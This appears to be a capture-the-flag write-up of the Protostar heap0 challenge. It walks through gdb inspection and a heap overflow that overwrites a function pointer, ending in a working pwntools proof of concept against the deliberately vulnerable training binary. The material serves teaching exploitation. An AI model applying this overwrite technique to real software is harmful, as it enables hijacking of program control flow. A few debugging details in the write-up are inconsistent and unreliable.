# Protostar : Heap Level 0 

I have turned off pie for the sake of learning how the heap works to reduce the difficulty of this challenge : 

```python
gcc heap0.c -no-pie -o heap0
```

Here is the full code to be compiled :

```cpp
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
struct data {
  char name[64];
};
struct fp {
  int (*fp)();
};
void winner()
{
  printf("level passed\n");
}
void nowinner()
{
  printf("level has not been passed\n");
}
int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;
  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);
  strcpy(d->name, argv[1]);
  f->fp();
}
```

we can see a winner funciton with decompiles to printing :

printf("level passed");

this means that for this specific challenge, we will need to overwrite some type of address
in the binary to go to the address and execute it.

```java
remnux@remnux:~/heap$ objdump -d intel heap0 | grep winner
/usr/bin/objdump: 'intel': No such file
0000000000401196 <winner>:
00000000004011b0 <nowinner>:
  4011fd:	48 8d 15 ac ff ff ff 	lea    rdx,[rip+0xffffffffffffffac]        # 4011b0 <nowinner>

Giving the binary normal buffer doesn't work :
```

```c
gef>  r AAAA
Starting program: /home/remnux/heap/heap0 AAAA
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
data is at 0x4052a0, fp is at 0x4052f0
level has not been passed
[Inferior 1 (process 3196) exited normally]
```
So we can see that the binary prints the address where the data exsits... meaning we can set a breakpoint and see how that data looks in memory.
The location of the breakpoint doesn't matter as long as it's after everything executes.
I like to put a breakpoint on the "leave" instruction in this case such that everything would have already executed : 

```c
gef >  disassem main
Dump of assembler code for function main:
   0x00000000004011ca <+0>:	endbr64
   0x00000000004011ce <+4>:	push   rbp
   0x00000000004011cf <+5>:	mov    rbp,rsp
   0x00000000004011d2 <+8>:	sub    rsp,0x20
   0x00000000004011d6 <+12>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004011d9 <+15>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004011dd <+19>:	mov    edi,0x40
   0x00000000004011e2 <+24>:	call   0x4010a0 <malloc@plt>
   0x00000000004011e7 <+29>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004011eb <+33>:	mov    edi,0x8
   0x00000000004011f0 <+38>:	call   0x4010a0 <malloc@plt>
   0x00000000004011f5 <+43>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011f9 <+47>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004011fd <+51>:	lea    rdx,[rip+0xffffffffffffffac]        # 0x4011b0 <nowinner>
   0x0000000000401204 <+58>:	mov    QWORD PTR [rax],rdx
   0x0000000000401207 <+61>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040120b <+65>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040120f <+69>:	mov    rsi,rax
   0x0000000000401212 <+72>:	lea    rax,[rip+0xe12]        # 0x40202b
   0x0000000000401219 <+79>:	mov    rdi,rax
   0x000000000040121c <+82>:	mov    eax,0x0
   0x0000000000401221 <+87>:	call   0x401090 <printf@plt>
   0x0000000000401226 <+92>:	mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040122a <+96>:	add    rax,0x8
   0x000000000040122e <+100>:	mov    rdx,QWORD PTR [rax]
   0x0000000000401231 <+103>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401235 <+107>:	mov    rsi,rdx
   0x0000000000401238 <+110>:	mov    rdi,rax
   0x000000000040123b <+113>:	call   0x401070 <strcpy@plt>
   0x0000000000401240 <+118>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401244 <+122>:	mov    rdx,QWORD PTR [rax]
   0x0000000000401247 <+125>:	mov    eax,0x0
   0x000000000040124c <+130>:	call   rdx
   0x000000000040124e <+132>:	mov    eax,0x0
   0x0000000000401253 <+137>:	leave #### this will be our break point.
   0x0000000000401254 <+138>:	ret
End of assembler dump.
gef>  b *0x0000000000401253
Breakpoint 1 at 0x401253
```

after doing this, we will feed the binary some characters (as parameters) and see how it will
look in memory, which may tell us something else to move on with :


```c
gef> r ABCDABCDABCD ## the program now has ABCDABCDABCD stored somewhere in memory. 

0x00007fffffffdc80â”‚+0x0000: 0x00007fffffffddc8  â†’  0x00007fffffffe128  â†’  "/home/remnux/heap/heap0"	 â† $rsp
0x00007fffffffdc88â”‚+0x0008: 0x00000002f7fe5af0
0x00007fffffffdc90â”‚+0x0010: 0x00000000004052a0  â†’  "ABCDABCDABCD"
0x00007fffffffdc98â”‚+0x0018: 0x00000000004052f0  â†’  0x00000000004011b0  â†’  <nowinner+0000> endbr64 
0x00007fffffffdca0â”‚+0x0020: 0x00007fffffffdd40  â†’  0x00007fffffffdda0  â†’  0x0000000000000000	 â† $rbp
0x00007fffffffdca8â”‚+0x0028: 0x00007ffff7c2a1ca  â†’  <__libc_start_call_main+007a> mov edi, eax
0x00007fffffffdcb0â”‚+0x0030: 0x00007fffffffdcf0  â†’  0x0000000000403e00  â†’  0x0000000000401160  â†’  <__do_global_dtors_aux+0000> endbr64 
0x00007fffffffdcb8â”‚+0x0038: 0x00007fffffffddc8  â†’  0x00007fffffffe128  â†’  "/home/remnux/heap/heap0"
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
     0x401247 <main+007d>      mov    eax, 0x0
     0x40124c <main+0082>      call   rdx
     0x40124e <main+0084>      mov    eax, 0x0
â—â†’   0x401253 <main+0089>      leave  
     0x401254 <main+008a>      ret    
     0x401255                  add    BYTE PTR [rax], al
     0x401257                  add    bl, dh
     0x401259 <_fini+0001>     nop    edx
     0x40125c <_fini+0004>     sub    rsp, 0x8
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
[#0] Id 1, Name: "heap0", stopped 0x401253 in main (), reason: BREAKPOINT
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
[#0] 0x401253 â†’ main()
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

We hit a breakpoint as written in this line :

[#0] Id 1, Name: "heap0", stopped 0x401253 in main (), reason: BREAKPOINT

Let's now search for our data in memory :

```c
gef>  search-pattern AAFf
[+] Searching 'AAFf' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x4052a0 - 0x4052a4  â†’   "AAFf" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffd9a0 - 0x7fffffffd9a4  â†’   "AAFf" 
  0x7fffffffe143 - 0x7fffffffe147  â†’   "AAFf" 
```



We will look in the heap since we already know data is located in the heap (the challenge is a heap challenge) :  

```c
gef>  x/40gx 0x4052a0
0x4052a0:	0x0000000066464141	0x0000000000000000
<SNIP>
```

we can see that our input starts at - 0x4052a0m where 0x0000000066464141 is A A F f (Reversed because data is stored in LE or Little Endian)

here is a better  view :
```c
gef>  x/44gx 0x4052a0
0x4052a0:	0x0000000066464141	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000021
0x4052f0:	0x00000000004011b0	0x0000000000000000 <-- We can see an address here 
```

At 0x4052f0, there is something that looks like an address, which may hint towards
overwriting it.... So what we need to do is do enough padding to reach the function and write the winner function address and hope we get the result we want.

Recall from above 
```c
remnux@remnux:~/heap$ objdump -d intel heap0 | grep winner
/usr/bin/objdump: 'intel': No such file
0000000000401196 <winner>:
00000000004011b0 <nowinner>:
  4011fd:	48 8d 15 ac ff ff ff 	lea    rdx,[rip+0xffffffffffffffac]        # 4011b0 <nowinner>
```

If we look in memory at 0x4052f0, we will see the address of nowinner (which is the same address in memory)
t.

We will need to calculate the number of bytes here which is the padding until the address :
```c
0x4052a0:	0x0000000066464141	0x0000000000000000 # 16 bytes
0x4052b0:	0x0000000000000000	0x0000000000000000 # 16 bytes
0x4052c0:	0x0000000000000000	0x0000000000000000 # 16 bytes
0x4052d0:	0x0000000000000000	0x0000000000000000 # 16 bytes
0x4052e0:	0x0000000000000000	0x0000000000000021 # 16 bytes
0x4052f0:	0x00000000004011b0	0x0000000000000000 # 3 bytes (the winner address being : 0x401196 )
```
After trail and error :
```c
gef>  pattern create 80
[+] Generating a pattern of 80 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
[+] Saved as '$_gef0'
gef>  search-pattern aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
[+] Searching 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x4052a0 - 0x4052d7  â†’   "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe0f7 - 0x7fffffffe12e  â†’   "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]" 
gef>  x/40gx 0x4052a0
0x4052a0:	0x6161616161616161	0x6161616161616162
0x4052b0:	0x6161616161616163	0x6161616161616164
0x4052c0:	0x6161616161616165	0x6161616161616166
0x4052d0:	0x6161616161616167	0x6161616161616168
0x4052e0:	0x6161616161616169	0x616161616161616a
0x4052f0:	0x0000000000401100	0x0000000000000000
0x405300:	0x0000000000000000	0x0000000000000411
```
We can see that our address has lost the 'b0', the reason why it was removed is because of the null terminator in any buffer. Meaning buffer will automatically add a null terminiator at the end of the buffer.

So the actual number of A(s) is 80, and 1st one after 80 is a line break/Null terminator.

we see at 0x4052f0, that we are about to write there, this means whatever address is
there, it will execute, let's try to add an address via python2 :
```c
remnux@remnux:~/heap$ python2.7 -c 'print "A"*80 + "\x96\x11\x40\x00"' > payload
remnux@remnux:~/heap$ ./heap0 `cat payload`
bash: warning: command substitution: ignored null byte in input
data is at 0x388d52a0, fp is at 0x388d52f0
level passed
remnux@remnux:~/heap$ 
```
let's now try to see that in memory (now that we got the message), and see what that address 
that was there was :
```c
gef>  p nowinner
$2 = {<text variable, no debug info>} 0x4011b0 <nowinner>
gef>  p winner
$1 = {<text variable, no debug info>} 0x401196 <winner>
gef>  x/40gx 0x4052a0
0x4052a0:	0x4141414141414141	0x4141414141414141
0x4052b0:	0x4141414141414141	0x4141414141414141
0x4052c0:	0x4141414141414141	0x4141414141414141
0x4052d0:	0x4141414141414141	0x4141414141414141
0x4052e0:	0x4141414141414141	0x4141414141414141
0x4052f0:	0x0000000000401196	0x0000000000000000
```
So all this time we were basically trying to overwrite the address of nowinner to print 
the result for winner.

here is what the program looks like with nowinner :
```c
remnux@remnux:~/heap$ ./heap0 payload
data is at 0x2bf3a2a0, fp is at 0x2bf3a2f0
level has not been passed
```
compared to if it was successfully passed :
```c
remnux@remnux:~/heap$ ./heap0 `cat payload`
bash: warning: command substitution: ignored null byte in input
data is at 0x388d52a0, fp is at 0x388d52f0
level passed
```
Let's construct the poc in Python3 : 

```c
remnux@remnux:~/heap$ cat heap0.py
from pwn import *

elf = context.binary = ELF('./heap0', checksec=False)

payload = b'A' * 80 + p32(0x401196)
print(f"param 1 :{payload}\n")
p = elf.process(argv=[payload])
print(p.clean().decode('latin-1'))
remnux@remnux:~/heap$ python3 heap0.py
param 1 :b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11@\x00'

[+] Starting local process '/home/remnux/heap/heap0': pid 5930
[*] Process '/home/remnux/heap/heap0' stopped with exit code 0 (pid 5930)
data is at 0x293fb2a0, fp is at 0x293fb2f0
level passed
```
